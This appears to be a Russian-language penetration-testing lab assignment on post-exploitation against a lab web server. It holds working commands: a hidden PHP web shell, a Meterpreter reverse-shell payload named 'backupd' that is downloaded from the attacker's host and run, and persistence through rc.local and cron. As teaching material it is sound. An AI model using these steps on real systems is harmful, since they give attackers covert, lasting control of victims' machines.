
## Цель работы

Освоить методы закрепления на компрометированной системе после успешного проникновения, включая установку персистентных бэкдоров и создание каналов удалённого управления.

---

## Задачи работы

- Установить бэкдор на веб-сервер (IP: `10.10.6.4`) для сохранения доступа.
    
- Создать реверс-шелл с помощью `Metasploit Framework`.
    
- Настроить персистентность через автозагрузку (cron/systemd).
    

---

## Теоретическая часть

### 1. Этап постэксплуатации в киберкиллчейне

**Постэксплуатация** — критическая фаза пентеста, начинающаяся после получения первоначального доступа к системе. Её цели:

1. **Закрепление позиций:** Предотвращение потери доступа при перезагрузке/обновлении системы.
    
2. **Эскалация привилегий:** Получение прав root/Administrator.
    
3. **Перемещение по сети:** Доступ к другим узлам внутренней сети.
    
4. **Сбор данных:** Извлечение конфиденциальной информации (пароли, документы, ключи).
    
5. **Маскировка активности:** Удаление логов, использование легитимных процессов.
    

### 2. Техники сохранения доступа

#### 2.1 Бэкдоры

- **Определение:** Скрытые механизмы для удалённого управления системой в обход аутентификации.
    
- **Типы:**
    
    - _Сетевые:_ Открытие скрытых портов (напр., веб-шеллы PHP).
        
    - _Пользовательские:_ Модификация SSH-ключей, RDP-клиентов.
        
    - _Бинарные:_ Замена системных утилит (e.g., модифицированный `netstat`).
        

#### 2.2 Реверс-шеллы

- **Принцип работы:** Инициация соединения **от жертвы к атакующему**, обходя фаерволы/NAT.
    
- **Преимущества:**
    
    - Не требует открытия портов на цели.
        
    - Маскируется под легитимный трафик (HTTPS/DNS).
        
- **Инструменты:** `Netcat`, `Metasploit`, `PowerCat` (Windows).
    

#### 2.3 Персистентность

- **Методы автозапуска:**
    
    - **Linux:**
        
        - Cron-задачи (`@reboot /root/.backdoor.sh`).
            
        - Systemd-сервисы.
            
        - Файлы `~/.bashrc`, `/etc/rc.local`.
            
    - **Windows:**
        
        - Реестр (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`).
            
        - Планировщик задач (Task Scheduler).
            

### 3. Инструментарий

**Metasploit Framework:**

- Генерация шеллов (`msfvenom`).
    
- Управление сессиями (`multi/handler`).
    
- Автоматизация постэксплуатации (модули `post/*`).
    

**Netcat:**

- Создание bind/reverse-shell.
    
- Переадресация портов.
    
- Ручная передача файлов.
    

---

## Ход выполнения лабораторной работы

_Предполагается, что уязвимость на `10.10.6.4` уже эксплуатирована (напр., через RCE в веб-приложении)._

### Шаг 1: Установка веб-шелла

**Цель:** Создать скрытый доступ через веб-интерфейс.

1. Загрузите PHP-бэкдор на сервер:
    

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > .hidden.php
``` 

2. Проверьте доступ:
    

```bash
curl http://10.10.6.4/.hidden.php?cmd=id
```
_Ожидаемый вывод:_ `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

### Шаг 2: Создание реверс-шелла через Metasploit

**Цель:** Получить интерактивную сессию Meterpreter.

1. Сгенерируйте полезную нагрузку:
    
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ВАШ_IP LPORT=4444 -f elf > backupd  
```  

2. Запустите обработчик в Metasploit:
    
```text
msf6 > use exploit/multi/handler  
msf6 > set payload linux/x64/meterpreter/reverse_tcp  
msf6 > set LHOST 0.0.0.0  
msf6 > set LPORT 4444  
msf6 > run  
```
3. Через веб-шелл выполните на цели:
    
```bash
curl http://ВАШ_IP/backupd -o /tmp/backupd && chmod +x /tmp/backupd && /tmp/backupd
```

### Шаг 3: Настройка персистентности

**Цель:** Сохранить доступ после перезагрузки.

1. В сессии Meterpreter:
    

```text
meterpreter > shell  
$ echo "nohup /tmp/backupd &" >> /etc/rc.local  
$ (crontab -l ; echo "@reboot sleep 60 && /tmp/backupd")|crontab -  
```


2. Проверьте:
```text
$ crontab -l  
$ cat /etc/rc.local  
```


---

## Форма отчета

1. **Цель и задачи.**
    
2. **Теория:** Краткое описание техник постэксплуатации.
    
3. **Результаты:**
    
    - Вывод команды `id` через веб-шелл (скриншот).
        
    - Скриншот сессии Meterpreter.
        
    - Подтверждение настройки автозапуска (содержимое `crontab`).
        
4. **Выводы:**
    
    - Почему реверс-шеллы эффективнее бинд-шеллов?
        
    - Какие методы маскировки бэкдора были использованы?
        
    - Риски использования `rc.local` vs `cron`.
        

---

## Вопросы для самоконтроля

1. Чем отличается бинд-шелл от реверс-шелла?
    
2. Почему Meterpreter предпочтительнее стандартного шелла?
    
3. Как обнаружить бэкдор в автозагрузке Linux?
    
4. Какие риски создаёт оставление веб-шелла?
    
5. Как защититься от техник, использованных в работе?
    
6. Зачем нужен `nohup` при добавлении в автозапуск?